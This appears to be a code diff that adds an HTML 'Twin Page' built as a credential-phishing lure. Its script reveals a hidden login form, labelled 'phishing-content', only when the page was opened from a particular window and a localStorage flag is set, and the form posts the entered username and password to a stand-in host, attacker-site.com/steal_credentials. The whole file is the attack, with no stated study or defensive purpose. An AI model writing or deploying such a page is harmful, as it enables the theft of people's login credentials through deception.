@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Twin Page</title>
+    <script>
+        function checkMainPage() {
+            if (window.opener && window.opener.name === 'button-main' && window.localStorage.getItem('mainOpen') === 'true') {
+                document.getElementById('phishing-content').style.display = 'block';
+            } else {
+                document.getElementById('phishing-content').style.display = 'none';
+            }
+        }
+        window.onload = checkMainPage;
+        window.onbeforeunload = function() {
+            window.localStorage.removeItem('mainOpen');
+        };
+        setInterval(checkMainPage, 1000);
+    </script>
+</head>
+<body>
+    <h1>Welcome to the Twin Page</h1>
+    <div id="phishing-content" style="display:none;">
+        <form action="http://attacker-site.com/steal_credentials" method="post">
+            <label for="username">Username:</label>
+            <input type="text" id="username" name="username"><br>
+            <label for="password">Password:</label>
+            <input type="password" id="password" name="password"><br>
+            <input type="submit" value="Login">
+        </form>
+    </div>
+</body>
+</html>
